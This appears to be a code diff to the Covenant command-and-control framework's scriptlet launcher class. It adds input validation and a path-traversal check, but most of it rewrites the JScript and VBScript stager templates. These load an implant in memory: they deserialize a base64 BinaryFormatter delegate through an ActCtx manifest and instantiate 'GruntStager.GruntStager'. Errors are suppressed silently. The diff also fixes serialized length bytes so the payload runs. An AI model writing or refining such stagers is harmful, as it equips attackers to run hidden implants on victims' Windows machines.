@@ -35,7 +35,13 @@ namespace Covenant.Models.Launchers
     {
         [Key, DatabaseGenerated(DatabaseGeneratedOption.Identity)]
         public int Id { get; set; }
+
+        [Required(ErrorMessage = "Listener is required")]
+        [Range(1, int.MaxValue, ErrorMessage = "Please select a valid Listener")]
         public int ListenerId { get; set; }
+
+        [Required(ErrorMessage = "ImplantTemplate is required")]
+        [Range(1, int.MaxValue, ErrorMessage = "Please select a valid ImplantTemplate")]
         public int ImplantTemplateId { get; set; }
 
         public string Name { get; set; } = "";
@@ -51,11 +57,20 @@ namespace Covenant.Models.Launchers
         public bool UseCertPinning { get; set; } = false;
 
         // Smb Options
+        [Required(ErrorMessage = "SMB Pipe Name is required")]
+        [StringLength(256, MinimumLength = 1, ErrorMessage = "SMB Pipe Name must be between 1 and 256 characters")]
+        [RegularExpression(@"^[a-zA-Z0-9_\-\.]+$", ErrorMessage = "SMB Pipe Name can only contain letters, numbers, underscores, hyphens, and periods")]
         public string SMBPipeName { get; set; } = "gruntsvc";
 
+        [Range(0, 86400, ErrorMessage = "Delay must be between 0 and 86400 seconds (24 hours)")]
         public int Delay { get; set; } = 5;
+
+        [Range(0, 100, ErrorMessage = "Jitter must be between 0 and 100 percent")]
         public int JitterPercent { get; set; } = 10;
+
+        [Range(1, int.MaxValue, ErrorMessage = "Connect Attempts must be at least 1")]
         public int ConnectAttempts { get; set; } = 5000;
+
         public DateTime KillDate { get; set; } = DateTime.Now.AddDays(30);
         public string LauncherString { get; set; } = "";
         public string StagerCode { get; set; } = "";
@@ -67,17 +82,75 @@ namespace Covenant.Models.Launchers
             {
                 try
                 {
-                    return Convert.ToBase64String(System.IO.File.ReadAllBytes(Common.CovenantLauncherDirectory + Name));
+                    string safePath = GetSafeLauncherPath();
+                    if (string.IsNullOrEmpty(safePath) || !System.IO.File.Exists(safePath))
+                    {
+                        return "";
+                    }
+                    return Convert.ToBase64String(System.IO.File.ReadAllBytes(safePath));
                 }
-                catch
+                catch (System.IO.IOException)
+                {
+                    return "";
+                }
+                catch (UnauthorizedAccessException)
                 {
                     return "";
                 }
             }
             set
             {
-                System.IO.File.WriteAllBytes(Common.CovenantLauncherDirectory + Name, Convert.FromBase64String(value)); 
+                if (string.IsNullOrEmpty(value))
+                {
+                    return;
+                }
+
+                string safePath = GetSafeLauncherPath();
+                if (string.IsNullOrEmpty(safePath))
+                {
+                    throw new ArgumentException("Invalid launcher name");
+                }
+
+                byte[] bytes;
+                try
+                {
+                    bytes = Convert.FromBase64String(value);
+                }
+                catch (FormatException)
+                {
+                    throw new ArgumentException("Invalid Base64 string for launcher content");
+                }
+
+                System.IO.File.WriteAllBytes(safePath, bytes);
             }
+        }
+
+        private string GetSafeLauncherPath()
+        {
+            if (string.IsNullOrEmpty(Name))
+            {
+                return null;
+            }
+
+            // Sanitize name to prevent path traversal
+            string safeName = System.IO.Path.GetFileName(Name);
+            if (string.IsNullOrEmpty(safeName) || safeName != Name)
+            {
+                return null; // Name contained path separators
+            }
+
+            string fullPath = System.IO.Path.Combine(Common.CovenantLauncherDirectory, safeName);
+
+            // Verify the path is within the launcher directory
+            string normalizedPath = System.IO.Path.GetFullPath(fullPath);
+            string normalizedDir = System.IO.Path.GetFullPath(Common.CovenantLauncherDirectory);
+
+            if (!normalizedPath.StartsWith(normalizedDir, StringComparison.OrdinalIgnoreCase))
+            {
+                return null; // Path traversal attempt
+            }
+
+            return fullPath;
         }
 
         public virtual string GetLauncher(string StagerCode, byte[] StagerAssembly, Grunt grunt, ImplantTemplate template) { return ""; }
@@ -119,7 +192,27 @@ namespace Covenant.Models.Launchers
             this.Base64ILByteString = Convert.ToBase64String(StagerAssembly);
 
             // Credit DotNetToJscript (tyranid - James Forshaw)
-            byte[] serializedDelegate = Convert.FromBase64String(FrontBinaryFormattedDelegate).Concat(StagerAssembly).Concat(Convert.FromBase64String(EndBinaryFormattedDelegate)).ToArray();
+            // Decode the front delegate template
+            byte[] frontBytes = Convert.FromBase64String(FrontBinaryFormattedDelegate);
+
+            // CRITICAL: Patch the array length in the serialized data
+            // The FrontBinaryFormattedDelegate ends with an ArraySinglePrimitive header:
+            // [0x0F][ObjectId:4bytes][Length:4bytes][ElementType:1byte]
+            // The length field is at position (length - 5) to (length - 2)
+            // We must patch it to match the actual StagerAssembly size
+            int lengthPosition = frontBytes.Length - 5;
+            byte[] assemblyLengthBytes = BitConverter.GetBytes(StagerAssembly.Length);
+            frontBytes[lengthPosition] = assemblyLengthBytes[0];
+            frontBytes[lengthPosition + 1] = assemblyLengthBytes[1];
+            frontBytes[lengthPosition + 2] = assemblyLengthBytes[2];
+            frontBytes[lengthPosition + 3] = assemblyLengthBytes[3];
+
+            // Now concatenate: patched front + assembly bytes + end
+            byte[] serializedDelegate = frontBytes.Concat(StagerAssembly).Concat(Convert.FromBase64String(EndBinaryFormattedDelegate)).ToArray();
+
+            // Store actual byte length BEFORE any padding - this is critical for deserialization
+            int actualByteLength = serializedDelegate.Length;
+
             int ofs = serializedDelegate.Length % 3;
             if (ofs != 0)
             {
@@ -127,25 +220,23 @@ namespace Covenant.Models.Launchers
                 Array.Resize(ref serializedDelegate, length);
             }
             string base64Delegate = Convert.ToBase64String(serializedDelegate);
-            int lineLength = 80;
-            List<String> splitString = new List<String>();
-            for (int i = 0; i < base64Delegate.Length; i += lineLength)
-            {
-                splitString.Add(base64Delegate.Substring(i, Math.Min(lineLength, base64Delegate.Length - i)));
-            }
 
             string language = "";
-			string code = "";
+            string code = "";
             if (this.ScriptLanguage == ScriptingLanguage.JScript)
             {
-				string DelegateBlock = String.Join("\"+\r\n\"", splitString.ToArray());
-				code = JScriptTemplate.Replace(Environment.NewLine, "\r\n").Replace("{{REPLACE_GRUNT_IL_BYTE_STRING}}", DelegateBlock);
+                // JScript: use single string (like the working GadgetToJScript example)
+                code = JScriptTemplate.Replace(Environment.NewLine, "\r\n")
+                    .Replace("{{REPLACE_GRUNT_IL_BYTE_STRING}}", base64Delegate)
+                    .Replace("{{REPLACE_BYTE_LENGTH}}", actualByteLength.ToString());
                 language = "JScript";
             }
             else if(this.ScriptLanguage == ScriptingLanguage.VBScript)
             {
-				string DelegateBlock = String.Join("\"\r\ns = s & \"", splitString.ToArray());
-				code = VBScriptTemplate.Replace(Environment.NewLine, "\r\n").Replace("{{REPLACE_GRUNT_IL_BYTE_STRING}}", DelegateBlock);
+                // VBScript: use single string
+                code = VBScriptTemplate.Replace(Environment.NewLine, "\r\n")
+                    .Replace("{{REPLACE_GRUNT_IL_BYTE_STRING}}", base64Delegate)
+                    .Replace("{{REPLACE_BYTE_LENGTH}}", actualByteLength.ToString());
                 if (this.ScriptType == ScriptletType.Stylesheet)
                 {
                     code = "<![CDATA[\r\n" + code + "\r\n]]>";
@@ -180,9 +271,9 @@ namespace Covenant.Models.Launchers
             {
                 this.DiskCode = this.DiskCode.Replace("{{REPLACE_VERSION_SETTER}}", "");
             }
-            else if (this.DotNetVersion == Common.DotNetVersion.Net40)
+            else if (this.DotNetVersion == Common.DotNetVersion.Net45 || this.DotNetVersion == Common.DotNetVersion.Net48)
             {
-                this.DiskCode = this.DiskCode.Replace("{{REPLACE_VERSION_SETTER}}", JScriptNet40VersionSetter);
+                this.DiskCode = this.DiskCode.Replace("{{REPLACE_VERSION_SETTER}}", JScriptNet45VersionSetter);
             }
             return GetLauncher();
         }
@@ -211,57 +302,88 @@ namespace Covenant.Models.Launchers
     </ms:script>
 </stylesheet>";
         protected static String JScriptTemplate =
-@"function toStream(bytes) {
-    var encoder = new ActiveXObject(""System.Text.ASCIIEncoding"");
-    var length = encoder.GetByteCount_2(bytes);
-    var transformedBytes = encoder.GetBytes_4(bytes);
-    var transform = new ActiveXObject(""System.Security.Cryptography.FromBase64Transform"");
-    transformedBytes = transform.TransformFinalBlock(transformedBytes, 0, length);
-    var stream = new ActiveXObject(""System.IO.MemoryStream"");
-    stream.Write(transformedBytes, 0, (length / 4) * 3);
-    stream.Position = 0;
-    return stream;
+@"var manifestXML = '<?xml version=""1.0"" encoding=""UTF-16"" standalone=""yes""?><assembly manifestVersion=""1.0"" xmlns=""urn:schemas-microsoft-com:asm.v1""><assemblyIdentity name=""mscorlib"" version=""4.0.0.0"" publicKeyToken=""B77A5C561934E089"" />'+
+'<clrClass clsid=""{9E28EF95-9C6F-3A00-B525-36A76178CC9C}"" progid=""System.Text.ASCIIEncoding"" threadingModel=""Both"" name=""System.Text.ASCIIEncoding"" runtimeVersion=""v4.0.30319"" />'+
+'<clrClass clsid=""{C1ABB475-F198-39D5-BF8D-330BC7189661}"" progid=""System.Security.Cryptography.FromBase64Transform"" threadingModel=""Both"" name=""System.Security.Cryptography.FromBase64Transform"" runtimeVersion=""v4.0.30319"" />'+
+'<clrClass clsid=""{F5E692D9-8A87-349D-9657-F96E5799D2F4}"" progid=""System.IO.MemoryStream"" threadingModel=""Both"" name=""System.IO.MemoryStream"" runtimeVersion=""v4.0.30319"" />'+
+'<clrClass clsid=""{50369004-DB9A-3A75-BE7A-1D0EF017B9D3}"" progid=""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"" threadingModel=""Both"" name=""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"" runtimeVersion=""v4.0.30319"" />'+
+'<clrClass clsid=""{6896B49D-7AFB-34DC-934E-5ADD38EEEE39}"" progid=""System.Collections.ArrayList"" threadingModel=""Both"" name=""System.Collections.ArrayList"" runtimeVersion=""v4.0.30319"" /></assembly>';
+
+var actObj = new ActiveXObject(""Microsoft.Windows.ActCtx"");
+actObj.ManifestText = manifestXML;
+
+function Base64ToStream(b, byteLen) {
+    var enc = actObj.CreateObject(""System.Text.ASCIIEncoding"");
+    var length = enc.GetByteCount_2(b);
+    var ba = enc.GetBytes_4(b);
+    var transform = actObj.CreateObject(""System.Security.Cryptography.FromBase64Transform"");
+    ba = transform.TransformFinalBlock(ba, 0, length);
+    var ms = actObj.CreateObject(""System.IO.MemoryStream"");
+    ms.Write(ba, 0, byteLen);
+    ms.Position = 0;
+    return ms;
 }
 
 {{REPLACE_VERSION_SETTER}}
-var assembly_str = ""{{REPLACE_GRUNT_IL_BYTE_STRING}}"";
-var stream = toStream(assembly_str);
-var formatter = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
-var array = new ActiveXObject('System.Collections.ArrayList');
-var delegate = formatter.Deserialize_2(stream);
-array.Add(undefined);
-var o = delegate.DynamicInvoke(array.ToArray()).CreateInstance('Grunt.GruntStager');";
-        protected static string JScriptNet40VersionSetter =
-@"var s = new ActiveXObject('Wscript.Shell');
-s.Environment('Process')('COMPLUS_Version') = 'v4.0.30319';";
+var serialized_obj = ""{{REPLACE_GRUNT_IL_BYTE_STRING}}"";
+
+try {
+    var stream = Base64ToStream(serialized_obj, {{REPLACE_BYTE_LENGTH}});
+    var formatter = actObj.CreateObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
+    var array = actObj.CreateObject('System.Collections.ArrayList');
+    var d = formatter.Deserialize_2(stream);
+    array.Add(undefined);
+    var asm = d.DynamicInvoke(array.ToArray());
+    var o = asm.CreateInstance('GruntStager.GruntStager');
+} catch(e) {}";
+        protected static string JScriptNet45VersionSetter = @"var shell = new ActiveXObject('WScript.Shell');
+shell.Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
+";
 
         protected static String VBScriptTemplate =
-@"Function Base64ToStream(bytes)
-  Dim encoder, length, transform, stream
-  Set encoder = CreateObject(""System.Text.ASCIIEncoding"")
-  length = encoder.GetByteCount_2(bytes)
-  Set transform = CreateObject(""System.Security.Cryptography.FromBase64Transform"")
-  Set stream = CreateObject(""System.IO.MemoryStream"")
-  stream.Write transform.TransformFinalBlock(encoder.GetBytes_4(bytes), 0, length), 0, ((length / 4) * 3)
-  stream.Position = 0
-  Set Base64ToStream = stream
+@"Dim manifestXML, actObj
+manifestXML = ""<?xml version=""""1.0"""" encoding=""""UTF-16"""" standalone=""""yes""""?>"" & _
+""<assembly manifestVersion=""""1.0"""" xmlns=""""urn:schemas-microsoft-com:asm.v1"""">"" & _
+""<assemblyIdentity name=""""mscorlib"""" version=""""4.0.0.0"""" publicKeyToken=""""B77A5C561934E089"""" />"" & _
+""<clrClass clsid=""""{9E28EF95-9C6F-3A00-B525-36A76178CC9C}"""" progid=""""System.Text.ASCIIEncoding"""" threadingModel=""""Both"""" name=""""System.Text.ASCIIEncoding"""" runtimeVersion=""""v4.0.30319"""" />"" & _
+""<clrClass clsid=""""{C1ABB475-F198-39D5-BF8D-330BC7189661}"""" progid=""""System.Security.Cryptography.FromBase64Transform"""" threadingModel=""""Both"""" name=""""System.Security.Cryptography.FromBase64Transform"""" runtimeVersion=""""v4.0.30319"""" />"" & _
+""<clrClass clsid=""""{F5E692D9-8A87-349D-9657-F96E5799D2F4}"""" progid=""""System.IO.MemoryStream"""" threadingModel=""""Both"""" name=""""System.IO.MemoryStream"""" runtimeVersion=""""v4.0.30319"""" />"" & _
+""<clrClass clsid=""""{50369004-DB9A-3A75-BE7A-1D0EF017B9D3}"""" progid=""""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"""" threadingModel=""""Both"""" name=""""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"""" runtimeVersion=""""v4.0.30319"""" />"" & _
+""<clrClass clsid=""""{6896B49D-7AFB-34DC-934E-5ADD38EEEE39}"""" progid=""""System.Collections.ArrayList"""" threadingModel=""""Both"""" name=""""System.Collections.ArrayList"""" runtimeVersion=""""v4.0.30319"""" />"" & _
+""</assembly>""
+
+Set actObj = CreateObject(""Microsoft.Windows.ActCtx"")
+actObj.ManifestText = manifestXML
+
+Function Base64ToStream(b, byteLen)
+    Dim enc, length, ba, transform, ms
+    Set enc = actObj.CreateObject(""System.Text.ASCIIEncoding"")
+    length = enc.GetByteCount_2(b)
+    ba = enc.GetBytes_4(b)
+    Set transform = actObj.CreateObject(""System.Security.Cryptography.FromBase64Transform"")
+    ba = transform.TransformFinalBlock(ba, 0, length)
+    Set ms = actObj.CreateObject(""System.IO.MemoryStream"")
+    ms.Write ba, 0, byteLen
+    ms.Position = 0
+    Set Base64ToStream = ms
 End Function
 
 {{REPLACE_VERSION_SETTER}}
+On Error Resume Next
 Dim s
 s = ""{{REPLACE_GRUNT_IL_BYTE_STRING}}""
 
-Dim formatter, array, delegate, output
-Set formatter = CreateObject(""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"")
-Set array = CreateObject(""System.Collections.ArrayList"")
-array.Add Empty
+Dim formatter, arr, d, asm, o
+Set formatter = actObj.CreateObject(""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"")
+Set arr = actObj.CreateObject(""System.Collections.ArrayList"")
+arr.Add Empty
 
-Set delegate = formatter.Deserialize_2(Base64ToStream(s))
-Set output = delegate.DynamicInvoke(array.ToArray()).CreateInstance(""Grunt.GruntStager"")";
-        protected static String VBScriptNet40VersionSetter =
-@"Dim shell, ver
-  Set shell = CreateObject(""WScript.Shell"")
-  ver = ""v4.0.30319""
-  shell.Environment(""Process"").Item(""COMPLUS_Version"") = ver";
+Set d = formatter.Deserialize_2(Base64ToStream(s, {{REPLACE_BYTE_LENGTH}}))
+Set asm = d.DynamicInvoke(arr.ToArray())
+Set o = asm.CreateInstance(""GruntStager.GruntStager"")";
+        protected static String VBScriptNet45VersionSetter = @"Dim shell
+Set shell = CreateObject(""WScript.Shell"")
+shell.Environment(""Process"")(""COMPLUS_Version"") = ""v4.0.30319""
+";
     }
 }
